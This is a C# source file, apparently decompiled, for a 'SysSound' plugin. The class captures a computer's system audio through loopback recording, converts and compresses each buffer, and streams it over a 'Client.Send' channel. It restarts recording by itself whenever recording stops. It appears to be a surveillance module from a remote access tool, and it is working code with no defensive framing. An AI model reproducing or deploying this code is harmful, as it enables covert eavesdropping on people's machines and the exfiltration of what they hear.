using System;
using System.IO;
using System.IO.Compression;
using Leb128;
using NAudio.Wave;
using Plugin.Helper;

namespace Plugin;

internal class SysSound
{
	public static bool isok;

	public static IWaveIn waveIn;

	public static void Recovery()
	{
		isok = true;
		waveIn = new WasapiLoopbackCapture();
		waveIn.DataAvailable += waveIn_DataAvailable;
		waveIn.RecordingStopped += waveIn_Stop;
		waveIn.StartRecording();
	}

	public static void waveIn_Stop(object sender, StoppedEventArgs eventArgs)
	{
		if (isok)
		{
			waveIn.StartRecording();
		}
	}

	private unsafe static byte[] Float16Bit(int bytesRecorded, byte[] buffer)
	{
		byte[] array = new byte[bytesRecorded / 2];
		fixed (byte* ptr = buffer)
		{
			fixed (byte* ptr3 = array)
			{
				float* ptr2 = (float*)ptr;
				short* ptr4 = (short*)ptr3;
				int num = bytesRecorded / 4;
				for (int i = 0; i < num; i++)
				{
					ptr4[i] = (short)(ptr2[i] * 32767f);
				}
			}
		}
		return array;
	}

	public static void waveIn_DataAvailable(object sender, WaveInEventArgs e)
	{
		try
		{
			if (isok)
			{
				byte[] inputBytes = Float16Bit(e.BytesRecorded, e.Buffer);
				Client.Send(LEB128.Write(new object[3]
				{
					"SystemSound",
					"Sound",
					Compress(inputBytes)
				}));
			}
		}
		catch (Exception ex)
		{
			Client.Error(ex.Message);
		}
	}

	private static byte[] Compress(byte[] inputBytes)
	{
		using MemoryStream memoryStream = new MemoryStream();
		using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Compress))
		{
			deflateStream.Write(inputBytes, 0, inputBytes.Length);
		}
		return memoryStream.ToArray();
	}

	public static void Stop()
	{
		isok = false;
		waveIn.StopRecording();
		if (waveIn != null)
		{
			waveIn.Dispose();
		}
	}
}
